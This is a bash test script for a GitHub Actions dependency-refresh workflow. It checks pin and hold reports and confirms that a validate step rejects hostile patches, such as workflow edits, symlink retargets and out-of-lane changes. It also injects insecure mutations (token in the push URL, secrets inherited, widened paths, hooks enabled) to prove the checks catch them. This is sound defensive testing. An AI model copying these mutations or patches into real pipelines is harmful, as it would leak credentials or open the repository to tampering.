    d="$WORK/x-none"; rm -rf "$d" "$d.tmp"; new_repo "$d"
    mkdir -p "$d.tmp/deps-cadence"; : > "$d.tmp/deps-cadence/stage.z"; : > "$d.tmp/deps-cadence/lanes.md"; : > "$d.tmp/deps-cadence/pins.md"
    if ! out="$(cd "$d" && gh_shell "$package" RUNNER_TEMP="$d.tmp" LANES="bun:/web" GITHUB_OUTPUT="$d.out" 2>&1)"; then
        echo "nothing moved, yet the package step failed"; rc=1
    elif ! grep -q '::notice::Nothing moved' <<<"$out" || ! grep -qx 'changed=false' "$d.out"; then
        echo "nothing moved must be a ::notice:: and changed=false"; rc=1
    fi
    if ! grep -qF "needs.refresh.outputs.changed == 'true'" <<<"$(job_block "$impl" open-pr)"; then
        echo "open-pr is not gated on the refresh having changed something"; rc=1
    fi

    # 10 (executed). hostile patches are rejected before anything is applied.
    hostile_checks "$validate" || rc=1

    # 8. the exact-pin report.
    report_checks "$impl" "$report" || rc=1
    report2_checks "$impl" "$report2" || rc=1
    holds_checks "$impl" "$holds" || rc=1
    return "$rc"
}

# report2_checks <impl> <report2-script> — 12: the pub and cargo section.
report2_checks() {
    local impl="$1" step="$2" rc=0 d out cond c pins sum lit
    # The bun and npm section is read by literal strings in another repo: all
    # five must survive in that step, and the "not reported" claim must be gone.
    c="$(step_block "$impl" "$REPORT_STEP")"
    for lit in 'echo "### Exact pins (bun and npm lanes)"' 'echo "| Manifest | Package | Pinned | Latest |"' \
        'No exact pin is behind its latest release in the $checked manifest(s) evaluated.' \
        'No bun or npm lane declares an exact pin.' '**Could not evaluate** (not the same as current):'; do
        grep -qF -- "$lit" <<<"$c" || { echo "the bun and npm report lost the literal: $lit"; rc=1; }
    done
    if grep -qE 'exact pins are not reported' "$impl"; then
        echo "the impl still says pub and cargo exact pins are not reported"; rc=1
    fi
    grep -qF 'echo "### Exact pins (pub and cargo lanes)"' <<<"$(step_block "$impl" "$REPORT2_STEP")" \
        || { echo "the pub and cargo step does not write its own heading"; rc=1; }

    # fixtures: one pub lane at app/ and a cargo lane at the root.
    local fx="$WORK/r2"; rm -rf "$fx"; mkdir -p "$fx"
    cat > "$fx/pubspec.yaml" <<'EOF'
name: app
dependencies:
  flutter:
    sdk: flutter
  http: ^1.0.0
  intl: "0.19.0"   # exact, behind
  path_dep:
    path: ../x
dev_dependencies:
  lints: 3.0.0
dependency_overrides:
  ignored: 1.0.0
EOF
    cat > "$fx/pub.json" <<'EOF'
{"packages":[{"package":"http","latest":{"version":"1.5.0"}},{"package":"intl","latest":{"version":"0.20.2"}},{"package":"lints","latest":{"version":"3.0.0"}}]}
EOF
    cat > "$fx/search.txt" <<'EOF'
serde_json = "1.0.1"    # sibling listed first
serde = "1.0.228"    # the one asked for
anyhow = "1.0.0"    # current
EOF
    : > "$fx/empty.txt"
    # seed <dir> — a scratch repo root with the pub lane and cargo metadata.
    seed() {
        local dd="$1" here
        rm -rf "$dd" "$dd.tmp" "$dd.summary"; mkdir -p "$dd/app" "$dd.tmp/deps-cadence"
        cp "$fx/pubspec.yaml" "$dd/app/pubspec.yaml"
        here="$(cd "$dd" && pwd)"
        cat > "$dd.meta" <<EOF
{"packages":[{"manifest_path":"$here/Cargo.toml","dependencies":[
 {"name":"serde","req":"=1.0.100","source":"registry+https://github.com/rust-lang/crates.io-index"},
 {"name":"anyhow","req":"=1.0.0","source":"registry+https://github.com/rust-lang/crates.io-index"},
 {"name":"tokio","req":"^1.0.0","source":"registry+https://github.com/rust-lang/crates.io-index"},
 {"name":"local","req":"=0.1.0","source":null},
 {"name":"gitdep","req":"=0.2.0","source":"git+https://example.com/x"}]}]}
EOF
        echo "OLD SECTION" > "$dd.tmp/deps-cadence/pins.md"
    }
    d="$WORK/p-stale"; seed "$d"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web pub:/app cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_FLUTTER_OUTDATED="$fx/pub.json" FAKE_CARGO_METADATA="$d.meta" FAKE_CARGO_SEARCH="$fx/search.txt" 2>&1)"; then
        echo "the pub and cargo report failed: $(tail -n1 <<<"$out")"; rc=1
    else
        pins="$d.tmp/deps-cadence/pins.md"
        sum="$d.summary"
        grep -qx 'OLD SECTION' "$pins" || { echo "the pub and cargo report did not append: the bun and npm section is gone"; rc=1; }
        grep -qxF '### Exact pins (pub and cargo lanes)' "$pins" || { echo "no pub and cargo heading in pins.md"; rc=1; }
        grep -qF '| `app/pubspec.yaml` | `intl` | 0.19.0 | 0.20.2 |' "$pins" || { echo "a stale pub pin (intl 0.19.0 < 0.20.2) is missing"; rc=1; }
        grep -qF '| `Cargo.toml` | `serde` | =1.0.100 | 1.0.228 |' "$pins" \
            || { echo "a stale cargo pin is missing or compared with a sibling crate's version: $(grep -F serde "$pins")"; rc=1; }
        if grep -qE '`(http|lints|anyhow|tokio|local|gitdep|ignored|path_dep)`' "$pins"; then
            echo "a range, a current pin, a path/git dependency or an override was reported: $(grep -E '`(http|lints|anyhow|tokio|local|gitdep|ignored|path_dep)`' "$pins" | head -1)"; rc=1
        fi
        grep -qF 'intl' "$sum" || { echo "the pub and cargo report did not reach the job summary"; rc=1; }
        ! grep -qx 'OLD SECTION' "$sum" || { echo "the job summary repeated the bun and npm section"; rc=1; }
    fi
    # Everything current: the "no pin is behind" sentence, counted.
    d="$WORK/p-current"; seed "$d"
    cat > "$fx/pub-current.json" <<'EOF'
{"packages":[{"package":"intl","latest":{"version":"0.19.0"}},{"package":"lints","latest":{"version":"3.0.0"}}]}
EOF
    printf 'serde = "1.0.100"    # x\nanyhow = "1.0.0"    # x\n' > "$fx/search-current.txt"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="pub:/app cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_FLUTTER_OUTDATED="$fx/pub-current.json" FAKE_CARGO_METADATA="$d.meta" FAKE_CARGO_SEARCH="$fx/search-current.txt" 2>&1)"; then
        echo "the pub and cargo report failed on a current repo: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -qF 'No exact pin is behind its latest release in the 2 manifest(s) evaluated.' "$d.tmp/deps-cadence/pins.md"; then
        echo "all-current did not read 'No exact pin is behind ... 2 manifest(s)': $(tail -n3 "$d.tmp/deps-cadence/pins.md" | tr '\n' ' ')"; rc=1
    fi
    # A failing flutter and an empty cargo search: could not evaluate, never current.
    d="$WORK/p-fail"; seed "$d"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="pub:/app cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_FLUTTER_OUTDATED="$fx/empty.txt" FAKE_FLUTTER_RC=1 FAKE_CARGO_METADATA="$d.meta" FAKE_CARGO_SEARCH="$fx/empty.txt" 2>&1)"; then
        echo "the pub and cargo report failed outright instead of reporting: $(tail -n1 <<<"$out")"; rc=1
    else
        pins="$d.tmp/deps-cadence/pins.md"
        { grep -qF 'Could not evaluate' "$pins" && grep -qF 'app/pubspec.yaml (flutter pub outdated' "$pins" && grep -qF 'serde: no latest version' "$pins"; } \
            || { echo "a failing flutter / empty cargo search was not reported as 'could not evaluate'"; rc=1; }
        ! grep -q 'No exact pin is behind' "$pins" || { echo "a manifest the tools could not evaluate was read as current"; rc=1; }
    fi
    # A cargo search that exits non-zero WITH output, and a failing cargo
    # metadata: the step still exits 0 and reports "could not evaluate" (an
    # errexit here would kill the refresh and open no PR that month).
    d="$WORK/p-searchrc"; seed "$d"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_CARGO_METADATA="$d.meta" FAKE_CARGO_SEARCH="$fx/search.txt" FAKE_CARGO_SEARCH_RC=1 2>&1)"; then
        echo "a failing cargo search killed the report step: $(tail -n1 <<<"$out")"; rc=1
    else
        pins="$d.tmp/deps-cadence/pins.md"
        { grep -qF 'Could not evaluate' "$pins" && grep -qF 'serde: no latest version' "$pins"; } \
            || { echo "a failing cargo search was not reported as 'could not evaluate'"; rc=1; }
        ! grep -q 'No exact pin is behind' "$pins" || { echo "a failing cargo search was read as current"; rc=1; }
    fi
    d="$WORK/p-metarc"; seed "$d"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_CARGO_METADATA="$d.meta" FAKE_CARGO_METADATA_RC=1 2>&1)"; then
        echo "a failing cargo metadata killed the report step: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -qF 'Cargo.toml (cargo metadata output not recognised)' "$d.tmp/deps-cadence/pins.md"; then
        echo "a failing cargo metadata was not reported as 'could not evaluate'"; rc=1
    fi
    # No pub or cargo lane: nothing is written at all.
    d="$WORK/p-none"; seed "$d"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web npm:/" GITHUB_STEP_SUMMARY="$d.summary" 2>&1)"; then
        echo "the pub and cargo report failed with no such lane: $(tail -n1 <<<"$out")"; rc=1
    elif [ "$(cat "$d.tmp/deps-cadence/pins.md")" != "OLD SECTION" ] || [ -e "$d.summary" ]; then
        echo "a bun- and npm-only repo's report changed"; rc=1
    fi
    # Lanes but no exact pins.
    d="$WORK/p-nopin"; seed "$d"
    printf 'name: app\ndependencies:\n  http: ^1.0.0\n' > "$d/app/pubspec.yaml"
    echo '{"packages":[]}' > "$d.meta"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="pub:/app cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_CARGO_METADATA="$d.meta" 2>&1)"; then
        echo "the pub and cargo report failed on a repo with no exact pins: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -qxF 'No pub or cargo lane declares an exact pin.' "$d.tmp/deps-cadence/pins.md"; then
        echo "no exact pins did not read 'No pub or cargo lane declares an exact pin.'"; rc=1
    fi
    # Like the bun and npm report, it never waits on a change.
    cond="$(step_block "$impl" "$REPORT2_STEP" | sed -n 's/^        if: //p')"
    [ -z "$cond" ] || { echo "the pub and cargo report's condition is '$cond'; it must run whether or not anything moved"; rc=1; }
    return "$rc"
}

# holds_checks <impl> <holds-script> — 14: the bare ignore: holds section (#524).
# The step carries a `{{IGNORE_RULES_AWK}}` placeholder that render-cadence.sh
# fills from lib-ecosystems.sh; this gate fills it the same way (from the same
# variable), so it executes the parser the validator and the renderer run.
holds_checks() {
    local impl="$1" step="$2" rc=0 d out fx="$WORK/h14" awkprog
    rm -rf "$fx"; mkdir -p "$fx"
    awkprog="$( . "$ROOT/skills/setup-deps/scripts/lib-ecosystems.sh"; printf '%s' "$IGNORE_RULES_AWK" )"
    [ -n "$awkprog" ] || { echo "lib-ecosystems.sh defines no IGNORE_RULES_AWK"; return 1; }
    grep -qxF '{{IGNORE_RULES_AWK}}' "$step" || { echo "the holds step has no {{IGNORE_RULES_AWK}} placeholder line (a hand copy of the parser?)"; return 1; }
    AWKPROG="$awkprog" perl -pe 'BEGIN { $p = $ENV{AWKPROG}; $p =~ s/\A\n//; } s/\A\{\{IGNORE_RULES_AWK\}\}\n\z/$p/' "$step" > "$fx/step.sh"
    ! grep -qF '{{IGNORE_RULES_AWK}}' "$fx/step.sh" || { echo "the placeholder was not filled"; return 1; }
    step="$fx/step.sh"

    cat > "$fx/dependabot.yml" <<'EOF'
version: 2
updates:
  - package-ecosystem: bun
    directory: /web
    ignore:
      # held: breaks the build
      - dependency-name: is-number
      - dependency-name: kind-of
        update-types: ["version-update:semver-major"]
      - dependency-name: left-pad
        versions: ["2.x"]
  - package-ecosystem: cargo
    directory: /
    ignore:
      - dependency-name: serde
  - package-ecosystem: gradle
    directory: /
    ignore:
      - dependency-name: com.example:lib
EOF
    echo '{"packages":[{"name":"serde","version":"1.0.100"},{"name":"anyhow","version":"1.0.0"}]}' > "$fx/meta.json"
    printf 'serde_json = "1.0.1"    # sibling first\nserde = "1.0.228"    # asked for\n' > "$fx/search.txt"
    printf 'serde = "1.0.100"    # current\n' > "$fx/search-current.txt"
    : > "$fx/empty.txt"
    # seed <name> <yml> — a scratch repo with the yml committed at .github/.
    seed() {
        d="$WORK/h14-$1"; rm -rf "$d" "$d.tmp" "$d.summary"; new_repo "$d"; mkdir -p "$d.tmp/deps-cadence"
        echo "OLD SECTION" > "$d.tmp/deps-cadence/pins.md"
        [ -z "${2:-}" ] || cp "$2" "$d/.github/dependabot.yml"
    }

    # Behind latest, in two refreshed ecosystems, and one that has no lookup.
    seed mixed "$fx/dependabot.yml"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_BUN_OUTDATED="$FIX/bun-outdated-workspaces.txt" FAKE_CARGO_METADATA="$fx/meta.json" FAKE_CARGO_SEARCH="$fx/search.txt" 2>&1)"; then
        echo "the holds report failed: $(tail -n1 <<<"$out")"; rc=1
    else
        pins="$d.tmp/deps-cadence/pins.md"
        grep -qx 'OLD SECTION' "$pins" || { echo "the holds report did not append: earlier sections are gone"; rc=1; }
        grep -qxF '### Bare ignore: holds' "$pins" || { echo "no '### Bare ignore: holds' heading in pins.md"; rc=1; }
        grep -qxF '| Lane | Package | Resolved | Latest |' "$pins" || { echo "no holds table header"; rc=1; }
        grep -qF '| `bun:/web` | `is-number` | 6.0.0 | 7.0.0 |' "$pins" || { echo "a bare bun hold behind latest is not listed"; rc=1; }
        grep -qF '| `cargo:/` | `serde` | 1.0.100 | 1.0.228 |' "$pins" \
            || { echo "a bare cargo hold behind latest is missing or compared with a sibling crate: $(grep -F serde "$pins")"; rc=1; }
        if grep -qE '`(kind-of|left-pad)`' "$pins"; then
            echo "a hold limited by update-types or versions was listed as bare: $(grep -E 'kind-of|left-pad' "$pins" | head -1)"; rc=1
        fi
        grep -qF 'Could not evaluate (no lookup for gradle)' "$pins" || { echo "a gradle hold was not listed as 'Could not evaluate (no lookup for gradle)'"; rc=1; }
        grep -qF 'is-number' "$d.summary" || { echo "the holds report did not reach the job summary"; rc=1; }
        ! grep -qx 'OLD SECTION' "$d.summary" || { echo "the job summary repeated an earlier section"; rc=1; }
    fi
    # A hold added by hand since the last render is read from the file at run time.
    seed hand "$fx/dependabot.yml"
    printf '      - dependency-name: left-pad\n' >> "$d/.github/dependabot.yml"
    sed -i.bak '/versions: \["2.x"\]/d' "$d/.github/dependabot.yml" && rm -f "$d/.github/dependabot.yml.bak"
    if out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_BUN_OUTDATED="$FIX/bun-outdated-workspaces.txt" FAKE_CARGO_METADATA="$fx/meta.json" FAKE_CARGO_SEARCH="$fx/search.txt" 2>&1)"; then
        grep -qF '`left-pad`' "$d.tmp/deps-cadence/pins.md" || { echo "a hold added by hand was not read from .github/dependabot.yml at run time"; rc=1; }
    else
        echo "the holds report failed on a hand-edited file: $(tail -n1 <<<"$out")"; rc=1
    fi
    # Everything current: the sentence, counted.
    cat > "$fx/current.yml" <<'EOF'
version: 2
updates:
  - package-ecosystem: cargo
    directory: /
    ignore:
      - dependency-name: serde
EOF
    seed current "$fx/current.yml"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_CARGO_METADATA="$fx/meta.json" FAKE_CARGO_SEARCH="$fx/search-current.txt" 2>&1)"; then
        echo "the holds report failed on a current repo: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -qF 'No bare ignore: hold is behind its latest release among the 1 evaluated.' "$d.tmp/deps-cadence/pins.md"; then
        echo "all-current did not read 'No bare ignore: hold is behind ... among the 1 evaluated.'"; rc=1
    fi
    # A failed lookup is "could not evaluate", never current.
    seed fail "$fx/dependabot.yml"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_BUN_OUTDATED="$FIX/bun-outdated-no-lockfile.txt" FAKE_BUN_OUTDATED_RC=1 \
            FAKE_CARGO_METADATA="$fx/meta.json" FAKE_CARGO_SEARCH="$fx/empty.txt" FAKE_CARGO_SEARCH_RC=1 2>&1)"; then
        echo "failing lookups killed the holds step: $(tail -n1 <<<"$out")"; rc=1
    else
        pins="$d.tmp/deps-cadence/pins.md"
        grep -qF '`is-number`: Could not evaluate (bun outdated failed' "$pins" || { echo "a failing bun outdated was not 'Could not evaluate'"; rc=1; }
        grep -qF '`serde`: Could not evaluate (no latest version from cargo search)' "$pins" || { echo "a failing cargo search was not 'Could not evaluate'"; rc=1; }
        ! grep -q 'No bare ignore: hold is behind' "$pins" || { echo "a failed lookup was read as current"; rc=1; }
    fi
    # A hold where no refreshed lane sits is not looked up as if one did.
    seed nolane "$fx/dependabot.yml"
    if out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_CARGO_METADATA="$fx/meta.json" FAKE_CARGO_SEARCH="$fx/search.txt" 2>&1)"; then
        grep -qF '`is-number`: Could not evaluate (no bun lane at /web is refreshed here)' "$d.tmp/deps-cadence/pins.md" \
            || { echo "a hold with no refreshed lane was not 'Could not evaluate'"; rc=1; }
    else
        echo "the holds report failed with no matching lane: $(tail -n1 <<<"$out")"; rc=1
    fi
    # No dependabot.yml, and a file with no bare hold.
    seed none
    rm -f "$d/.github/dependabot.yml"
    if ! out="$(cd "$d" && gh_shell "$step" RUNNER_TEMP="$d.tmp" LANES="bun:/web" GITHUB_STEP_SUMMARY="$d.summary" 2>&1)"; then
        echo "the holds report failed with no dependabot.yml: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -qxF 'No bare ignore: hold in .github/dependabot.yml.' "$d.tmp/deps-cadence/pins.md"; then
        echo "no dependabot.yml did not read 'No bare ignore: hold in .github/dependabot.yml.'"; rc=1
    fi
    # Like the other two reports, it never waits on a change.
    out="$(step_block "$impl" "$HOLDS_STEP" | sed -n 's/^        if: //p')"
    [ -z "$out" ] || { echo "the holds report's condition is '$out'; it must run whether or not anything moved"; rc=1; }
    return "$rc"
}

# report_checks <impl> <report-script> — the ported parser, then end to end.
report_checks() {
    local impl="$1" report="$2" rc=0 fn parsed d out cond
    fn="$WORK/parse.sh"
    awk '/^parse_bun_outdated\(\) \{$/ {f = 1} f {print} f && /^\}$/ {exit}' "$report" > "$fn"
    if [ ! -s "$fn" ]; then echo "no parse_bun_outdated() in the report step"; return 1; fi
    # shellcheck source=/dev/null
    . "$fn"
    pairs() { parse_bun_outdated < "$1" | sort | tr '\t\n' '= '; }
    parsed="$(pairs "$FIX/bun-outdated-plain.txt")"
    [ "$parsed" = "is-number=7.0.0 " ] || { echo "plain capture parsed as '$parsed'"; rc=1; }
    parsed="$(pairs "$FIX/bun-outdated-workspaces.txt")"
    [ "$parsed" = "is-number=7.0.0 left-pad=1.3.0 " ] || { echo "workspaces capture (extra column, (dev) suffix) parsed as '$parsed'"; rc=1; }
    parsed="$(pairs "$FIX/bun-outdated-color.txt")"
    [ "$parsed" = "is-number=7.0.0 left-pad=1.3.0 " ] || { echo "coloured capture (U+2502 columns, ANSI cells) parsed as '$parsed'"; rc=1; }
    parsed="$(printf 'total garbage, no table\n' | parse_bun_outdated)"
    [ -z "$parsed" ] || { echo "garbage parsed to rows: $parsed"; rc=1; }
    parsed="$(parse_bun_outdated < "$FIX/bun-outdated-no-lockfile.txt")"
    [ -z "$parsed" ] || { echo "the missing-lockfile error parsed to rows: $parsed"; rc=1; }
    unset -f parse_bun_outdated pairs

    # End to end: the stale exact pin is reported, the range is not.
    d="$WORK/r-stale"; rm -rf "$d" "$d.tmp"; new_repo "$d"
    if ! out="$(cd "$d" && gh_shell "$report" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_BUN_OUTDATED="$FIX/bun-outdated-plain.txt" 2>&1)"; then
        echo "the report step failed: $(tail -n1 <<<"$out")"; rc=1
    else
        grep -qF '| `web/package.json` | `is-number` | 6.0.0 | 7.0.0 |' "$d.tmp/deps-cadence/pins.md" \
            || { echo "a stale exact pin (is-number 6.0.0 < 7.0.0) is missing from the report"; rc=1; }
        grep -q 'left-pad' "$d.tmp/deps-cadence/pins.md" && { echo "a caret range was reported as an exact pin"; rc=1; }
        grep -qF 'is-number' "$d.summary" || { echo "the report did not reach the job summary"; rc=1; }
    fi
    # A failing `bun outdated` is "could not evaluate", never current.
    d="$WORK/r-fail"; rm -rf "$d" "$d.tmp"; new_repo "$d"
    if ! out="$(cd "$d" && gh_shell "$report" RUNNER_TEMP="$d.tmp" LANES="bun:/web" GITHUB_STEP_SUMMARY="$d.summary" \
            FAKE_BUN_OUTDATED="$FIX/bun-outdated-no-lockfile.txt" FAKE_BUN_OUTDATED_RC=1 2>&1)"; then
        echo "the report step failed outright instead of reporting: $(tail -n1 <<<"$out")"; rc=1
    elif ! grep -q 'Could not evaluate' "$d.tmp/deps-cadence/pins.md" || grep -q 'No exact pin is behind' "$d.tmp/deps-cadence/pins.md"; then
        echo "a failing bun outdated was not reported as 'could not evaluate'"; rc=1
    fi
    # The report never waits on a change: it carries no condition at all.
    cond="$(step_block "$impl" "$REPORT_STEP" | sed -n 's/^        if: //p')"
    [ -z "$cond" ] \
        || { echo "the report step's condition is '$cond'; it must run whether or not anything moved"; rc=1; }
    return "$rc"
}

# hostile_checks <validate-script> — each hostile patch, built in a clone of a
# scratch repo, must be rejected by the validate step and leave a fresh clone
# untouched. Hostile = anything the refresh could never legitimately produce.
hostile_checks() {
    local validate="$1" rc=0 base="$WORK/h-base" name d out
    rm -rf "$base"; new_repo "$base"
    # name|shell run inside the hostile clone to produce the change
    local cases=(
        'a .github/ edit|echo "on: push" >> .github/workflows/ci.yml; echo x >> web/bun.lock'
        'a rename on allowed paths|git mv web/pkg/package.json web/package2.json; mkdir -p web/pkg2; git mv web/package2.json web/pkg2/package.json'
        'a mode change|chmod +x web/bun.lock'
        'a symlink retarget|rm web/sym/package.json; ln -s ../../Cargo.toml web/sym/package.json'
        'a new file on an allowed path|mkdir -p web/new; echo "{}" > web/new/package.json; git add -N web/new/package.json'
        'a binary hunk|printf "lock\000bin\n" > web/bun.lock'
        'a path outside every lane|echo x >> src/main.rs'
    )
    local c
    for c in "${cases[@]}"; do
        name="${c%%|*}"
        d="$WORK/h-$RANDOM"
        rm -rf "$d" "$d.mk" "$d.tmp"
        git clone -q "$base" "$d.mk"
        (cd "$d.mk" && bash -c "${c#*|}" && git add -A && git diff --cached --binary -M > "$WORK/hostile.patch") >/dev/null 2>&1
        if [ ! -s "$WORK/hostile.patch" ]; then echo "hostile case '$name' produced no patch (fixture broken)"; rc=1; continue; fi
        git clone -q "$base" "$d"
        mkdir -p "$d.tmp/deps-cadence-in"; cp "$WORK/hostile.patch" "$d.tmp/deps-cadence-in/cadence.patch"
        if out="$(cd "$d" && gh_shell "$validate" RUNNER_TEMP="$d.tmp" LANES="bun:/web cargo:/" 2>&1)"; then
            echo "the validate step ACCEPTED $name"; rc=1
        elif ! grep -q '::error::Rejected the refresh patch' <<<"$out"; then
            echo "$name failed without a rejection message: $(tail -n1 <<<"$out")"; rc=1
        elif [ -n "$(git -C "$d" status --porcelain)" ]; then
            echo "$name was rejected only AFTER changing the tree: $(git -C "$d" status --porcelain | tr '\n' ' ')"; rc=1
        fi
        rm -f "$WORK/hostile.patch"
    done
    return "$rc"
}

echo "deps-cadence policy:"
for f in "$TRIGGER" "$IMPL"; do
    [ -r "$f" ] || { bad "missing template: $f"; exit 1; }
done
for f in plain workspaces color no-lockfile; do
    [ -r "$FIX/bun-outdated-$f.txt" ] || { bad "missing fixture bun-outdated-$f.txt"; exit 1; }
done

if out="$(check "$TRIGGER" "$IMPL")"; then
    ok "templates hold every rule (one credential, failing refresh fails, no --label, lane-only staging, local-only trigger, plain --auto, exact-pin report)"
else
    while IFS= read -r l; do bad "$l"; done <<<"$out"
fi

# --- mutations: each regression must fail the check ---------------------------------
# mutate <name> <target trigger|impl> <from> <to> — LITERAL replacement.
mutate() {
    local name="$1" which="$2" src mt mi
    if [ "$which" = "trigger" ]; then src="$TRIGGER"; else src="$IMPL"; fi
    mt="$WORK/mut-trigger.yml"; mi="$WORK/mut-impl.yml"
    cp "$TRIGGER" "$mt"; cp "$IMPL" "$mi"
    local dst="$mi"; [ "$which" = "trigger" ] && dst="$mt"
    FROM="$3" TO="$4" perl -0pe 's/\Q$ENV{FROM}\E/$ENV{TO}/g' "$src" > "$dst"
    if cmp -s "$dst" "$src"; then
        bad "mutation ($name) changed nothing, so it proves nothing (template reworded?)"
    elif check "$mt" "$mi" >/dev/null 2>&1; then
        bad "mutation ($name) PASSED the check — the gate cannot catch it"
    else
        ok "mutation ($name) fails the check"
    fi
}

APP='GH_TOKEN: ${{ steps.app_token.outputs.token }}'
mutate "GITHUB_TOKEN fallback"       impl    "$APP" 'GH_TOKEN: ${{ steps.app_token.outputs.token || secrets.GITHUB_TOKEN }}'
mutate "PAT credential"              impl    "$APP" 'GH_TOKEN: ${{ secrets.DEPS_AUTOMATION_TOKEN }}'
mutate "trigger secrets: inherit"    trigger $'    secrets:\n      PLATFORM_WRITER_APP_CLIENT_ID: ${{ secrets.PLATFORM_WRITER_APP_CLIENT_ID }}\n      PLATFORM_WRITER_APP_PRIVATE_KEY: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}' '    secrets: inherit'
mutate "refresh failure swallowed"   impl    '(cd "./$rel" && bun update --recursive --ignore-scripts)' '(cd "./$rel" && bun update --recursive --ignore-scripts) || true'
mutate "unknown ecosystem tolerated" impl    $'                echo "::error::LANES names \'$eco\', which has no refresh command here. Re-render with sassy-dog:setup-deps."\n                exit 1 ;;' $'                echo "::warning::skipping $eco"\n                continue ;;'
mutate "continue-on-error"           impl    $'        id: refresh\n' $'        id: refresh\n        continue-on-error: true\n'
mutate "--label on the PR"           impl    '--title "$title" --body-file' '--title "$title" --label dependencies --body-file'
mutate "git add -A"                  impl    'git add --pathspec-from-file="$work/stage.z" --pathspec-file-nul' 'git add -A'
mutate "bun lane stages its whole dir" impl  '":(glob)${prefix}**/package.json"' '":(glob)${prefix}**"'
mutate "non-local uses in trigger"   trigger 'uses: ./.github/workflows/deps-cadence-impl.yml' 'uses: octo-org/shared/.github/workflows/deps-cadence-impl.yml@v1'
mutate "schedule in the impl"        impl    $'on:\n  workflow_call:' $'on:\n  schedule:\n    - cron: "0 9 1 * *"\n  workflow_call:'
mutate "self-hosted runs-on"         impl    'runs-on: ubuntu-latest' 'runs-on: [self-hosted, linux, sassy-dog]'
mutate "runner as a render fact"     impl    'runs-on: ubuntu-latest' 'runs-on: {{RUNNER}}'
mutate "token in the push URL"       impl    $'git "${nohooks[@]}" -c credential.helper= \\\n            -c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\' \\\n            push "https://github.com/${GITHUB_REPOSITORY}.git"' 'git "${nohooks[@]}" push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"'
mutate "token expanded into argv"    impl    $'-c \'credential.helper=!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f\'' $'-c "credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f"'
mutate "global git config honoured"  impl    $'          export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null\n' ''
mutate "hooks run on commit"         impl    'git "${nohooks[@]}" commit' 'git commit'
mutate "hooks run on branch switch"  impl    'git "${nohooks[@]}" switch' 'git switch'
MINT="$(sed -n '/^      - name: Mint GitHub App token$/,/^          private-key:/p' "$IMPL")"
mutate "App token minted early"      impl    $'      - name: Plan this month\'s run' "$MINT"$'\n\n      - name: Plan this month\'s run'
mutate "token minted in the refresh job" impl "      - name: $REFRESH_STEP" "$MINT"$'\n\n'"      - name: $REFRESH_STEP"
mutate "secrets in the refresh job"  impl    $'        id: refresh\n' $'        id: refresh\n        env:\n          KEY: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}\n'
mutate "open-pr runs a package manager" impl "      - name: $VALIDATE_STEP"$'\n' $'      - name: Install dependencies\n        run: bun install --frozen-lockfile\n\n'"      - name: $VALIDATE_STEP"$'\n'
mutate "allowed paths widened (.github/ passes)" impl 'allowed+="^${p}(.*/)?package\\.json\$|' 'allowed+=".*|'
mutate "patch-path validation removed" impl  $'[[ "$path" =~ $allowed ]] || reject "$path is outside the lanes\' manifests and lockfiles"' 'true'
mutate "plain bun update on a workspace root" impl '(cd "./$rel" && bun update --recursive --ignore-scripts)' '(cd "./$rel" && bun update --ignore-scripts)'
mutate "PR step on the built-in token" impl  "$APP" 'GH_TOKEN: ${{ github.token }}'
mutate "built-in token granted write" impl   $'permissions:\n  contents: read\n\njobs:' $'permissions:\n  contents: write\n\njobs:'
mutate "merge method flag"           impl    'gh pr merge --auto "$url"' 'gh pr merge --auto --squash "$url"'
mutate "parser ignores U+2502"       impl    's/\x1b\[[0-9;]*m//g; s/\xe2\x94\x82/|/g' 's/\x1b\[[0-9;]*m//g'
mutate "report waits on a change"    impl    $'      - name: Report exact pins (bun and npm lanes)\n' $'      - name: Report exact pins (bun and npm lanes)\n        if: ${{ steps.patch.outputs.changed == \'true\' }}\n'
